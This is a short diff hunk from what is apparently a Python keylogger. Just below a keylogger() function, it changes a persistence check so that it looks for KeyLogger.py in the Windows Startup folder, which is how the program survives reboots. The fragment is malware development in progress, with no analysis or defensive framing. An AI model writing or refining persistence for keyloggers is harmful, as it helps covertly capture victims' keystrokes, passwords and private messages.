@@ -43,7 +43,7 @@ def keylogger():
         l.join()
 
 def check_persistance():
-    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
+    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KeyLogger.py"):
         return True
     else:
         return False
